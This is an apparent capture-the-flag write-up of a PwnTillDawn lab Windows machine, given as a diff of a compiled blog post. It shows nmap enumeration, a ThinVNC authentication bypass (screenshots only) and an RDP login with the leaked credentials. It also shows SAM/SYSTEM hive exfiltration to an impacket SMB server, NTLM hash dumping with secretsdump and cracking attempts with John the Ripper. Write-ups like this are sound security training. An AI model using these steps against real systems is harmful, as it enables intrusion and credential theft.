@@ -1,0 +1,326 @@
+I"�c<p>This is a machine from the platform PwnTillDawn.</p>
+
+<p>Check the platform by yourself and happy hacking:</p>
+
+<p><a href="https://www.wizlynxgroup.com/">https://www.wizlynxgroup.com/</a></p>
+
+<p><a href="https://online.pwntilldawn.com/">https://online.pwntilldawn.com/</a></p>
+
+<p>Machine details:</p>
+
+<blockquote>
+  <p>OS: Windows</p>
+
+  <p>Rated as: Easy</p>
+
+  <p>IP: 10.150.150.69</p>
+
+  <p>Goal: Become root and capture 1 flag: FLAG67.txt.</p>
+</blockquote>
+
+<h1 id="manual-os-fingerprinting"><a href="#header-1"></a>Manual OS fingerprinting.</h1>
+
+<p>Pinging the machine and based on the <a href="https://subinsb.com/default-device-ttl-values/">TTL</a> I can conclude it’s a Windows box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+└─<span class="nv">$ </span>ping <span class="nt">-c</span> 1 10.150.150.69
+PING 10.150.150.69 <span class="o">(</span>10.150.150.69<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.150.150.69: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>170 ms
+
+<span class="nt">---</span> 10.150.150.69 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 170.245/170.245/170.245/0.000 ms
+</code></pre></div></div>
+
+<h1 id="port-scanning"><a href="#header-1"></a>Port scanning.</h1>
+
+<p>I use two port scans, in the first one I discover all open ports. In the second I perform a scan over those 
+discovered ports trying to discover the service versions and also try basic Nmap enum scripts.</p>
+
+<h2 id="first-scan"><a href="#header-2"></a>First scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ IP</span><span class="o">=</span>10.150.150.69<span class="p">;</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allports <span class="nt">--open</span> <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-03 17:15 EDT
+Nmap scan report <span class="k">for </span>10.150.150.69
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 64795 closed ports, 726 filtered ports
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5040/tcp  open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+50417/tcp open  unknown
+60000/tcp open  unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.98 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>In the first part, I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.</li>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code>: Scan all TCP ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=5000</code>: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t use DNS resolution (It goes faster this way).</li>
+  <li><code class="language-plaintext highlighter-rouge">-sT</code>: Use TCP connect scan. I prefer this rather than the default (stealth).</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery on the machine, it can save me some time. Before the scan I always test reachability to the machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oG allports</code>: Saves the Nmap output in grepable format to a file called <strong>allports</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">--open</code>: Only shows me open ports.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is where I call my env variable the IP of the machine.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>extract allports
+Open ports:  135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,50417,60000
+</code></pre></div></div>
+<p>If you want more info about that extract function, you can read <a href="https://juansec.github.io/PwnTillDawn-JuniorDev-Writeup">this post</a>.</p>
+
+<h2 id="-second-scan"><a href="#header-2"></a> Second scan.</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> targeted <span class="nv">$IP</span>
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-03 17:44 EDT
+Nmap scan report <span class="k">for </span>10.150.150.69
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: ELMARIACHI-PC
+|   NetBIOS_Domain_Name: ELMARIACHI-PC
+|   NetBIOS_Computer_Name: ELMARIACHI-PC
+|   DNS_Domain_Name: ElMariachi-PC
+|   DNS_Computer_Name: ElMariachi-PC
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-10-03T22:36:33+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ElMariachi-PC
+| Not valid before: 2021-10-02T19:18:50
+|_Not valid after:  2022-04-03T19:18:50
+|_ssl-date: 2021-10-03T22:37:03+00:00<span class="p">;</span> +49m21s from scanner time.
+5040/tcp  open  unknown
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+50417/tcp open  msrpc         Microsoft Windows RPC
+60000/tcp open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Type: text/html
+|     Content-Length: 177
+|     Connection: Keep-Alive
+|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL <span class="nb">nice</span>%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+|   GetRequest: 
+|     HTTP/1.1 401 Access Denied
+|     Content-Type: text/html
+|     Content-Length: 144
+|     Connection: Keep-Alive
+|     WWW-Authenticate: Digest <span class="nv">realm</span><span class="o">=</span><span class="s2">"ThinVNC"</span>, <span class="nv">qop</span><span class="o">=</span><span class="s2">"auth"</span>, <span class="nv">nonce</span><span class="o">=</span><span class="s2">"8ZpDwhS35UDI1kcCFLflQA=="</span>, <span class="nv">opaque</span><span class="o">=</span><span class="s2">"s5DGjSXV3HxDhmXNk4uwNebK5PxukPh3xK"</span>
+|_    &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port60000-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>10/3%Time<span class="o">=</span>615A2454%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
+SF:etRequest,179,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">2
+SF:0text/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20144</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Keep-Alive</span><span class="se">\r\n</span><span class="s2">WW
+SF:W-Authenticate:</span><span class="se">\x</span><span class="s2">20Digest</span><span class="se">\x</span><span class="s2">20realm=</span><span class="se">\"</span><span class="s2">ThinVNC</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20qop=</span><span class="se">\"</span><span class="s2">auth</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20non
+SF:ce=</span><span class="se">\"</span><span class="s2">8ZpDwhS35UDI1kcCFLflQA==</span><span class="se">\"</span><span class="s2">,</span><span class="se">\x</span><span class="s2">20opaque=</span><span class="se">\"</span><span class="s2">s5DGjSXV3HxDhmXNk4uwNebK5P
+SF:xukPh3xK</span><span class="se">\"\r\n\r\n</span><span class="s2">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied&lt;/TITLE&gt;&lt;/H
+SF:EAD&gt;&lt;BODY&gt;&lt;H1&gt;401</span><span class="se">\x</span><span class="s2">20Access</span><span class="se">\x</span><span class="s2">20Denied&lt;/H1&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20requires</span><span class="se">\x</span><span class="s2">20authorization</span><span class="se">\.</span><span class="s2">&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourReques
+SF:t,111,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20177</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20Keep-Alive</span><span class="se">\r\n\r\n</span><span class="s2">&lt;HTML&gt;&lt;HEA
+SF:D&gt;&lt;TITLE&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Foun
+SF:d&lt;/H1&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20nice%20ports%2C/Tri%6Eity</span><span class="se">\.</span><span class="s2">txt%2ebak</span><span class="se">\x</span><span class="s2">
+SF:20was</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20server</span><span class="se">\.</span><span class="s2">&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 49m20s, deviation: 0s, median: 49m20s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-10-03T22:36:34
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>193.85 seconds
+
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p$ports</code>: Only scan the ports I discovered from the previous scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=1000</code>: Fast scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sC</code>: Perform Nmap default scripts scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sV</code>: Do version detection.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t do DNS resolution.</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oN targeted</code>: Save the output to a file called targeted, using the normal format.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is the variable containing the IP.</li>
+</ul>
+
+<h1 id="smb-service-analysis"><a href="#header-1"></a>SMB service analysis.</h1>
+
+<p>First I decided to go after SMB service, I tried manually to login with guest user using <code class="language-plaintext highlighter-rouge">smbmap</code> and <code class="language-plaintext highlighter-rouge">smbclient</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>smbmap <span class="nt">-H</span> 10.150.150.69                                                                     
+<span class="o">[!]</span> Authentication error on 10.150.150.69
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> 10.150.150.69 <span class="nt">-U</span> <span class="s1">'guest'</span>
+Enter WORKGROUP<span class="se">\g</span>uest<span class="s1">'s password: 
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+</span></code></pre></div></div>
+
+<p>I was not lucky.</p>
+
+<h1 id="port-5040"><a href="#header-1"></a>Port 5040.</h1>
+
+<p>Nmap scan showed us an open port which service version wasn’t identified, let’s take a look:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>telnet 10.150.150.69 5040            
+Trying 10.150.150.69...
+Connected to 10.150.150.69.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+ehlo
+<span class="nb">whoami</span>
+
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nv</span> 10.150.150.69 5040
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.69] 5040 <span class="o">(</span>?<span class="o">)</span> open
+
+
+</code></pre></div></div>
+
+<p>Again I had no luck, looking <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/mt670791(v=ws.11)">here</a> seems like that port could be related 
+to the <code class="language-plaintext highlighter-rouge">RPC</code> service.</p>
+
+<h1 id="web-service-on-port-60000"><a href="#header-1"></a>Web service on port 60000.</h1>
+
+<p>The output of nmap told us that there could be a web service running on that port. After manually visiting it we face a login box:</p>
+
+<p><img src="assets/login_thinvnc.png" alt="" /></p>
+
+<p>The message says that the box is running ThinVNC, which is a web based <a href="https://sourceforge.net/projects/thinvnc/">software</a> for remote control compatible with VNC.</p>
+
+<p>Googling to find out default credentials of the service I found an <a href="https://redteamzone.com/ThinVNC/">interesting article</a> detailing a vulnerability of authentication bypass which also covers LFI.</p>
+
+<p>Manually testing it via BurpSuite we can extract the ThinVNC’s credentials:</p>
+
+<p><img src="assets/thin_creds.png" alt="" /></p>
+
+<p>And now we can login via ThinVNC:</p>
+
+<p><img src="assets/thin1.png" alt="" /></p>
+
+<p>However, the connection was veeery slow.</p>
+
+<h1 id="login-via-rdp"><a href="#header-1"></a>Login via RDP.</h1>
+
+<p>I tried the credentials of the ThinVNC service to access via RDP and I got a big success:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>xfreerdp +clipboard /u:desperado /v:10.150.150.69                                                                                                                 130 ⨯
+<span class="o">[</span>18:59:13:841] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+<span class="o">[</span>18:59:13:841] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+<span class="o">[</span>18:59:13:841] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
+<span class="o">[</span>18:59:13:841] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
+<span class="o">[</span>18:59:13:154] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.primitives] - primitives autodetect, using optimized
+<span class="o">[</span>18:59:13:159] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
+<span class="o">[</span>18:59:13:159] <span class="o">[</span>172747:172748] <span class="o">[</span>INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
+<span class="o">[</span>18:59:14:859] <span class="o">[</span>172747:172748] <span class="o">[</span>WARN][com.freerdp.crypto] - Certificate verification failure <span class="s1">'self signed certificate (18)'</span> at stack position 0
+<span class="o">[</span>18:59:14:859] <span class="o">[</span>172747:172748] <span class="o">[</span>WARN][com.freerdp.crypto] - CN <span class="o">=</span> ElMariachi-PC
+Password:
+</code></pre></div></div>
+
+<p><img src="assets/rdp1.png" alt="" /></p>
+
+<p>Our user <code class="language-plaintext highlighter-rouge">desperado</code> has admin privileges, that’s nice.</p>
+
+<p>Let’s capture that flag:</p>
+
+<p><img src="assets/FLAG67.png" alt="" /></p>
+
+<p>And with that the machine is done, right?</p>
+
+<h1 id="a-little-bit-of-post-exploitation"><a href="#header-1"></a>A little bit of post-exploitation.</h1>
+
+<p>Let’s extract the NTLM hashes of the machine.</p>
+
+<p>First we set up a SMB server in our attacking machine using <code class="language-plaintext highlighter-rouge">impacket</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# <span class="nb">sudo </span>impacket-smbserver tool <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<p>Then we transfer <code class="language-plaintext highlighter-rouge">SAM</code> and <code class="language-plaintext highlighter-rouge">SYSTEM</code> files from our victim to our machine via SMB.
+<img src="assets/sam.png" alt="" /></p>
+
+<p>Big success.</p>
+
+<p>Now we use <code class="language-plaintext highlighter-rouge">impacket</code> again to extract the hashes and save it to a file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>impacket-secretsdump <span class="nt">-sam</span> SAM <span class="nt">-system</span> SYSTEM LOCAL <span class="o">&gt;</span> sam_dump<span class="p">;</span> <span class="nb">cat </span>sam_dump                                                                                         1 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x13dc8b2d3be447472e92938a1327cae9
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:35a619ab012f0a6d6daf24eccfb0b11f:::
+Desperado:1004:aad3b435b51404eeaad3b435b51404ee:8fa2fdb26cd02c75c2c59bccad8dd9a0:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
+</code></pre></div></div>
+
+<p>Finally we remove unnecessary lines of the file and pass it through <code class="language-plaintext highlighter-rouge">JTR</code> with the help of <code class="language-plaintext highlighter-rouge">rockyou.txt</code> to see if we can crack Admin’s pass:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>john <span class="nt">--w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes <span class="nt">--format</span><span class="o">=</span>NT
+Using default input encoding: UTF-8
+Loaded 3 password hashes with no different salts <span class="o">(</span>NT <span class="o">[</span>MD4 256/256 AVX2 8x3]<span class="o">)</span>
+Remaining 2 password hashes with no different salts
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+0g 0:00:00:01 DONE <span class="o">(</span>2021-10-03 19:21<span class="o">)</span> 0g/s 7355Kp/s 7355Kc/s 14711KC/s  _ 09..<span class="k">*</span>7¡Vamos!
+Session completed
+</code></pre></div></div>
+
+<p>Sadly we couldn’t get any more passwords.</p>
+
+<p>And then we fire it up as client mode on the victim machine:</p>
+
+<h1 id="skills-used"><a href="header-1"></a>Skills used.</h1>
+
+<ul>
+  <li>Port enumeration with <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
+  <li>Manual service fingerprinting.</li>
+  <li>Google searching.</li>
+  <li>BurpSuite for exploiting LFI.</li>
+  <li>impacket for transfer files via SMB and extracting NTLM hashes.</li>
+  <li>JTR for cracking purposes.</li>
+</ul>
+
+<h1 id="final-thoughts"><a href="header-1"></a>Final thoughts.</h1>
+
+<p>I didn’t know about the existence of ThinVNC, now I know it could be vulnerable thanks to this machine :).</p>
+:ET
